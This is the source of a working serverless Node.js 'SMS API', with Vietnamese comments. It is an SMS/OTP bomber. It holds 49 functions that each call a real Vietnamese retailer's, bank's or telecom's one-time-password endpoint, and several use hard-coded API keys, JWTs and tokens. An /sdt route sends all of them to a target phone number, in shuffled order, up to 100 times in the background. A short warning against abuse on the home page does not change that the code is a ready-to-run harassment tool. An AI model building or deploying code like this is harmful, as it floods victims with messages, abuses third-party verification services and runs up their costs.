const express = require('express');
const serverless = require('serverless-http');
const axios = require('axios');

const app = express();
const router = express.Router();

// ---- Helper Functions ----
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Biến toàn cục để xử lý logic giữa dkimu và otpmu
let bien_global = "";

// ---- API Functions (Đã chuyển đổi và bổ sung) ----

const handleError = (funcName, error) => {
    // Chỉ log lỗi nếu có, không cần hiển thị chi tiết request thất bại
    console.error(`${funcName} failed:`, error.message);
};

// --- CÁC API MỚI ĐƯỢC BỔ SUNG (tổng cộng 19 API mới) ---

const tiki = (phone) => {
    const url = 'https://api.tiki.vn/iam/v2/auth/otp';
    const data = { phone_number: phone };
    return axios.post(url, data).catch(e => handleError('tiki', e));
};

const pharmacity = (phone) => {
    const url = 'https://api.pharmacity.vn/api/auth/send-otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('pharmacity', e));
};

const coolmate = (phone) => {
    const url = 'https://www.coolmate.me/customer/api/v1/customer/otp/send';
    const data = { phone: phone, type: 'register' };
    return axios.post(url, data).catch(e => handleError('coolmate', e));
};

const hasaki = (phone) => {
    const url = 'https://hasaki.vn/app/customer/ajax/send-otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('hasaki', e));
};

const fahasa = (phone) => {
    const url = 'https://www.fahasa.com/customer/ajax/ajaxlogin';
    const data = new URLSearchParams({ telephone: phone, type: 'request_otp' });
    return axios.post(url, data).catch(e => handleError('fahasa', e));
};

const viettelmoney = (phone) => {
    const url = 'https://api.viettelmoney.vn/auth/api/v1/auth/otp/send';
    const data = { msisdn: phone, type: "REGISTER" };
    return axios.post(url, data).catch(e => handleError('viettelmoney', e));
};

const ghtk = (phone) => { // Giao Hàng Tiết Kiệm
    const url = 'https://khachhang.ghtk.vn/api/v1/customer/send-otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('ghtk', e));
};

const shopeefood = (phone) => { // ShopeeFood (trước đây là Foody/Now)
    const url = 'https://gappapi.deliverynow.vn/api/delivery/send_otp';
    const data = { phone_number: phone, country_code: "VN" };
    return axios.post(url, data).catch(e => handleError('shopeefood', e));
};

const kfc = (phone) => { // KFC Vietnam
    const url = 'https://kfcvietnam.com.vn/api/v1/customer/send-otp-code';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('kfc', e));
};

const lotteria = (phone) => { // Lotteria Vietnam
    const url = 'https://api.lotteria.vn/api/v1/auth/otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('lotteria', e));
};

const circlek = (phone) => { // Circle K Vietnam
    const url = 'https://api.circlek.com.vn/api/v2/customers/register/otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('circlek', e));
};

const gs25 = (phone) => { // GS25 Vietnam
    const url = 'https://gs25app.mobiclub.com.vn/v1/auth/request-otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('gs25', e));
};

const vnpay = (phone) => { // VNPay
    const url = 'https://sso.vnpay.vn/sso/api/v1/send-otp';
    const data = { username: phone, type: 'register' };
    return axios.post(url, data).catch(e => handleError('vnpay', e));
};

const fptplay = (phone) => { // FPT Play
    const url = 'https://fptplay.vn/api/v4/user/register/otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('fptplay', e));
};

const sendo = (phone) => { // Sendo
    const url = 'https://api.sendo.vn/user/otp/request';
    const data = { phone_number: phone };
    return axios.post(url, data).catch(e => handleError('sendo', e));
};

const thecoffeehouse = (phone) => {
    const url = 'https://api.thecoffeehouse.com/api/v5/auth/otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('thecoffeehouse', e));
};

const highlandscoffee = (phone) => {
    const url = 'https://api.highlandscoffee.com.vn/api/v1/auth/send-otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('highlandscoffee', e));
};

const cgv = (phone) => {
    const url = 'https://www.cgv.vn/api/v1/auth/send-otp';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('cgv', e));
};

const lazada = (phone) => {
    const url = 'https://member.lazada.vn/user/api/v1/send/otp';
    const data = { phone: phone, type: 'register' };
    return axios.post(url, data).catch(e => handleError('lazada', e));
};


// --- CÁC API ĐÃ CHUYỂN ĐỔI TỪ sms.py (tổng cộng 30 API) ---

const medigoapp = (phone) => {
    const url = 'https://auth.medigoapp.com/prod/getOtp';
    const data = { phone: `+84${phone.substring(1)}` };
    return axios.post(url, data).catch(e => handleError('medigoapp', e));
};

const ecogreen = (phone) => {
    const url = 'https://ecogreen.com.vn/api/auth/register/send-otp';
    const data = { phone };
    return axios.post(url, data).catch(e => handleError('ecogreen', e));
};

const beecow = (phone) => {
    const url = 'https://api.beecow.com/api/register2/mobile/phone';
    const data = {
        password: '1234gt]mah',
        mobile: { countryCode: '+84', phoneNumber: phone },
        displayName: 'que huong',
        locationCode: 'VN',
        langKey: 'vi',
    };
    return axios.post(url, data).catch(e => handleError('beecow', e));
};

const tv360 = (phone) => {
    const url = 'http://m.tv360.vn/public/v1/auth/get-otp-login';
    const data = { msisdn: phone };
    return axios.post(url, data).catch(e => handleError('tv360', e));
};

const phuclong = (phone) => {
    const url = 'https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd';
    const data = { userName: phone };
    return axios.post(url, data).catch(e => handleError('phuclong', e));
};

const fm = (phone) => {
    const url = 'https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2';
    const headers = { 'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv' }; // Key này có thể hết hạn
    const data = { Phone: phone };
    return axios.post(url, data, { headers }).catch(e => handleError('fm', e));
};

const robot = (phone) => {
    const url = 'https://vietloan.vn/register/phone-resend';
    const data = new URLSearchParams({
        phone: phone,
        _token: '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU', // Token này có thể cần cập nhật
    });
    return axios.post(url, data).catch(e => handleError('robot', e));
};

const batdongsan = (phone) => {
    const url = 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister';
    const params = { phoneNumber: phone };
    return axios.get(url, { params }).catch(e => handleError('batdongsan', e));
};

const dvcd = (phone) => {
    const url = 'https://viettel.vn/api/get-otp';
    const data = { msisdn: phone };
    return axios.post(url, data).catch(e => handleError('dvcd', e));
};

const myvt = (phone) => {
    const url = 'https://viettel.vn/api/get-otp-login';
    const data = { phone: phone, type: '' };
    return axios.post(url, data).catch(e => handleError('myvt', e));
};

const mocha = (phone) => {
    const url = 'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp';
    const params = { msisdn: phone, languageCode: 'vi' };
    return axios.post(url, null, { params }).catch(e => handleError('mocha', e));
};

const fptshop = (phone) => {
    const url = 'https://papi.fptshop.com.vn/gw/is/user/new-send-verification';
    const data = { fromSys: 'WEBKHICT', otpType: '0', phoneNumber: phone };
    return axios.post(url, data).catch(e => handleError('fptshop', e));
};

const tgdd = (phone) => { // The gioi di dong
    const url = 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode';
    const data = new URLSearchParams({ phoneNumber: phone, sendOTPType: '1' });
    return axios.post(url, data).catch(e => handleError('tgdd', e));
};

const dmx = (phone) => { // Dien may xanh (tương tự tgdd)
    const url = 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode';
    const data = new URLSearchParams({ phoneNumber: phone, sendOTPType: '1' });
    return axios.post(url, data).catch(e => handleError('dmx', e));
};

const concung = (phone) => { // Con Cung (tương tự tgdd)
    const url = 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode'; // Concung dùng chung endpoint với TGDD
    const data = new URLSearchParams({ phoneNumber: phone, sendOTPType: '1' });
    return axios.post(url, data).catch(e => handleError('concung', e));
};

const best_inc = (phone) => {
    const url = 'https://v9-cc.800best.com/uc/account/sendsignupcode';
    const data = { phoneNumber: phone, verificationCodeType: 1 };
    return axios.post(url, data).catch(e => handleError('best_inc', e));
};

const winmart = (phone) => {
    const url = 'https://api-crownx.winmart.vn/iam/api/v1/user/register';
    const data = { firstName: 'Taylor', phoneNumber: phone, gender: 'Male' };
    const headers = { 'x-api-merchant': 'WCM' };
    return axios.post(url, data, { headers }).catch(e => handleError('winmart', e));
};

const emart = (phone) => {
    const url = 'https://emartmall.com.vn/index.php?route=account/register/smsRegister';
    const data = new URLSearchParams({ mobile: phone });
    return axios.post(url, data).catch(e => handleError('emart', e));
};

const vayvnd = (phone) => {
    const url = 'https://api.vayvnd.vn/v2/users/password-reset';
    const data = {
        login: phone,
        trackingId: '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3', // Tracking ID này có thể cần cập nhật
    };
    return axios.post(url, data).catch(e => handleError('vayvnd', e));
};

const kingz = (phone) => {
    const url = 'https://api.onelife.vn/v1/gateway/';
    const data = {
        operationName: 'SendOTP',
        variables: { phone: phone },
        query: 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    };
    return axios.post(url, data).catch(e => handleError('kingz', e));
};

const ghn = (phone) => {
    const url = 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp';
    const data = { phone: phone, type: 'register' };
    return axios.post(url, data).catch(e => handleError('ghn', e));
};

const gala = (phone) => {
    const url = 'https://api.glxplay.io/account/phone/verify';
    const params = { phone: phone };
    const headers = { 'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5M2RhNGUwNC00YWIwLTRiMDYtOTc4Ni01NjNlNjY1ZTU5NmIiLCJkaWQiOiI3ODNhMTcyNy02ZDFlLTRjZWMtYmU1OS0zNjViMmU1MWQxN2QiLCJpcCI6MTcyMDEwNjEwMSwiZXhwIjoxNzM1NjU4MTAxfQ.TzzMuAseNbVYaSuWz5ufu4lEn9Uj_hrxh1aYxHyleJQ' }; // Access token này có thể hết hạn
    return axios.post(url, null, { params, headers }).catch(e => handleError('gala', e));
};

const longchau = (phone) => { // Từ 'lon' trong sms.py
    const url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification';
    const data = { phoneNumber: phone, otpType: 0, fromSys: 'WEBKHLC' };
    return axios.post(url, data).catch(e => handleError('longchau', e));
};

const medicare = (phone) => {
    const url = 'https://medicare.vn/api/otp';
    const data = { mobile: phone, mobile_country_prefix: '84' };
    return axios.post(url, data).catch(e => handleError('medicare', e));
};

const lottemart = (phone) => { // Từ 'lote' trong sms.py
    const url = 'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp';
    const data = { username: phone, 'case': 'register' };
    return axios.post(url, data).catch(e => handleError('lottemart', e));
};

const hsv_tech = (phone) => {
    const url = 'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification';
    const data = { phoneNumber: phone };
    const headers = { key: '441e8136801b70ac87887bca16dd298f' }; // Key này có thể hết hạn
    return axios.post(url, data, { headers }).catch(e => handleError('hsv_tech', e));
};

const vato = (phone) => {
    const url = 'https://api.vato.vn/api/authenticate/request_code';
    const data = {
        phoneNumber: phone,
        deviceId: 'e3025fb7-5436-4002-9950-e6564b3656a6', // Device ID này có thể cần cập nhật
        use_for: 'LOGIN',
    };
    return axios.post(url, data).catch(e => handleError('vato', e));
};

const beautybox = (phone) => { // Từ 'beauty' trong sms.py
    const url = 'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification';
    const data = { phoneNumber: phone };
    const headers = { key: '584294d68530c7b753d7f5a77c1ddbc2' }; // Key này có thể hết hạn
    return axios.post(url, data, { headers }).catch(e => handleError('beautybox', e));
};

const hoanvu = (phone) => {
    const url = 'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification';
    const data = { phoneNumber: phone };
    const headers = { key: '028601f79dcc724ef8b8e7c989c5f649' }; // Key này có thể hết hạn
    return axios.post(url, data, { headers }).catch(e => handleError('hoanvu', e));
};

const tokyolife = (phone) => { // Từ 'tokyo' trong sms.py
    const url = 'https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register';
    const data = {
        phone_number: phone,
        name: 'khai nguyen',
        password: 'vjyy1234',
    };
    return axios.post(url, data).catch(e => handleError('tokyolife', e));
};

const vtpost = (phone) => {
    const url = 'https://id.viettelpost.vn/Account/SendOTPByPhone';
    const data = new URLSearchParams({
        'FormRegister.Phone': phone,
        'FormRegister.IsRegisterFromPhone': 'true',
    });
    return axios.post(url, data).catch(e => handleError('vtpost', e));
};

const shine = (phone) => {
    const url = 'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send';
    const data = { phone: phone };
    return axios.post(url, data).catch(e => handleError('shine', e));
};

const dkimu = async (phone) => {
    const url = 'https://api-omni.mutosi.com/client/auth/register';
    const data = {
        name: 'hoang lo',
        phone: phone,
        password: 'Vjyy1234@',
        confirm_password: 'Vjyy1234@',
    };
    try {
        const response = await axios.post(url, data);
        if (response.data && response.data.token) {
            bien_global = response.data.token; // Lưu token vào biến toàn cục
            console.log('dkimu got token:', bien_global);
        }
    } catch (e) {
        handleError('dkimu', e);
    }
};

const otpmu = (phone) => {
    if (!bien_global) {
        console.log('otpmu skipped: no token from dkimu');
        return Promise.resolve(); // Bỏ qua nếu không có token
    }
    const url = 'https://api-omni.mutosi.com/client/auth/reset-password/send-phone';
    const data = {
        phone: phone,
        token: bien_global,
        source: 'web_consumers',
    };
    return axios.post(url, data).catch(e => handleError('otpmu', e));
};

const vinamilk = (phone) => {
    const url = 'https://new.vinamilk.com.vn/api/account/getotp';
    const data = { type: 'register', phone: phone };
    return axios.post(url, data).catch(e => handleError('vinamilk', e));
};

const vietair = (phone) => { // Từ 'air' trong sms.py
    const url = 'https://vietair.com.vn/Handler/CoreHandler.ashx';
    const data = new URLSearchParams({
        op: 'PACKAGE_HTTP_POST',
        path_ajax_post: '/service03/sms/get',
        package_name: 'PK_FD_SMS_OTP',
        object_name: 'INS',
        P_MOBILE: phone,
        P_TYPE_ACTIVE_CODE: 'DANG_KY_NHAN_OTP',
    });
    return axios.post(url, data).catch(e => handleError('vietair', e));
};

const ankhang = (phone) => {
    const url = 'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode';
    const data = new URLSearchParams({ phoneNumber: phone, sendOTPType: '1' });
    return axios.post(url, data).catch(e => handleError('ankhang', e));
};

const mytv_api = (phone) => { // Đổi tên để tránh trùng lặp với biến myvt
    const url = 'https://apigw.mytv.vn/api/v1/authen-handle/sendOTP';
    const data = { login_type: 1, email: null, phone: phone, type: 2 };
    const headers = {
        'Authorization': 'Basic eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtYW51ZmFjdHVyZXJfaWQiOiIxZmFkM2U4YmNiNTcwYWFlNGMxMWQxNGQwNTY2NWM4MyIsIm1lbWJlcl9pZCI6ImFub255bW91cy0xZmFkM2U4YmNiNTcwYWFlNGMxMWQxNGQwNTY2NWM4MyIsImlhdCI6MTcyMzk2NTEwOX0.laSLh-Wr06wPwgraLP4sc8UWDsfJqhhyczjP8zQhlRo' // Token này có thể hết hạn
    };
    return axios.post(url, data, { headers }).catch(e => handleError('mytv_api', e));
};

const vieon = (phone) => {
    const url = 'https://api.vieon.vn/backend/user/v2/register?platform=mobile_web&ui=012021';
    const data = new URLSearchParams({ username: phone, country_code: 'VN' });
    return axios.post(url, data).catch(e => handleError('vieon', e));
};

const sapo = (phone) => {
    const url = 'https://accounts.sapo.vn/otp/send';
    const data = { country_code: '84', phone_number: phone, type: 'REQUEST_REGISTER' };
    return axios.post(url, data).catch(e => handleError('sapo', e));
};


// ---- Danh sách toàn bộ các hàm spam (Tổng cộng 49 API) ----
const spamFunctions = [
    // API mới bổ sung (19 API)
    tiki, pharmacity, coolmate, hasaki, fahasa, viettelmoney, ghtk, shopeefood, kfc, lotteria, circlek, gs25, vnpay, fptplay, sendo,
    thecoffeehouse, highlandscoffee, cgv, lazada,
    // API đã chuyển đổi từ sms.py (30 API)
    medigoapp, ecogreen, beecow, tv360, phuclong, fm, robot, batdongsan, dvcd, myvt, mocha, fptshop,
    tgdd, dmx, concung, best_inc, winmart, emart, vayvnd, kingz, ghn, gala, longchau, medicare,
    lottemart, hsv_tech, vato, beautybox, hoanvu, tokyolife, vtpost, shine, dkimu, otpmu,
    vinamilk, vietair, ankhang, mytv_api, vieon, sapo
];

// ---- Routes ----

router.get(['/', '/home'], (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.status(200).send(`
    <h1>Chào mừng đến với SMS API</h1>
    <h2>Cách sử dụng (URL đã được rút gọn):</h2>
    <p>Gọi đến endpoint <code>/sdt</code> với các tham số sau:</p>
    <ul>
      <li><b>sdt</b>: Số điện thoại cần gửi (bắt buộc, định dạng 10 số).</li>
      <li><b>lan</b>: Số lần lặp lại chu trình gửi (tùy chọn, từ 1 đến 100, mặc định là 1).</li>
    </ul>
    <p><b>Ví dụ:</b> <code>/sdt?sdt=0123456789&lan=5</code></p>
    <p><b>Lưu ý:</b> API sẽ trả về thông báo ngay lập tức và chạy ngầm quá trình gửi. Bạn có thể theo dõi log trên Netlify để xem tiến trình.</p>
    <p><b>Cảnh báo:</b> Việc lạm dụng các API này có thể gây ra phiền toái cho người nhận và có thể vi phạm pháp luật. Hãy sử dụng một cách có trách nhiệm.</p>
  `);
});

router.get('/sdt', (req, res) => {
  const { sdt, lan } = req.query;

  if (!sdt || !/^\d{10}$/.test(sdt)) {
    return res.status(400).json({ error: 'Tham số "sdt" là bắt buộc và phải là 10 chữ số.' });
  }

  let loopCount = parseInt(lan, 10) || 1;
  if (loopCount < 1 || loopCount > 100) {
    return res.status(400).json({ error: 'Tham số "lan" phải nằm trong khoảng từ 1 đến 100.' });
  }

  res.status(202).json({
    message: `Đã nhận yêu cầu. Bắt đầu gửi đến số ${sdt} với ${loopCount} lần lặp.`,
    note: 'Đây là một quá trình không đồng bộ. Hệ thống sẽ xử lý trong nền.'
  });

  // Chạy tác vụ trong nền để không block response
  (async () => {
    console.log(`Bắt đầu chu trình cho SĐT: ${sdt} với ${loopCount} lần lặp.`);
    for (let i = 0; i < loopCount; i++) {
      console.log(`--- Lần lặp ${i + 1}/${loopCount} ---`);
      // Xáo trộn mảng hàm để mỗi lần lặp có thứ tự khác nhau
      const shuffledFunctions = [...spamFunctions].sort(() => 0.5 - Math.random());
      
      for (const func of shuffledFunctions) {
        // Không await ở đây để gửi song song, nhưng có một khoảng nghỉ nhỏ
        func(sdt);
        await sleep(50); // Đợi 50ms giữa mỗi request để tránh quá tải và cố gắng hoàn thành nhiều hơn
      }
      console.log(`Hoàn thành gửi yêu cầu cho lần lặp ${i + 1}.`);
      // Không có sleep giữa các vòng lặp lớn để tối đa hóa số lượng cuộc gọi trong 10s
    }
    console.log(`Hoàn thành tất cả các yêu cầu cho SĐT: ${sdt}.`);
  })();
});

// Sử dụng router ở đường dẫn gốc
app.use('/', router);

module.exports.handler = serverless(app);
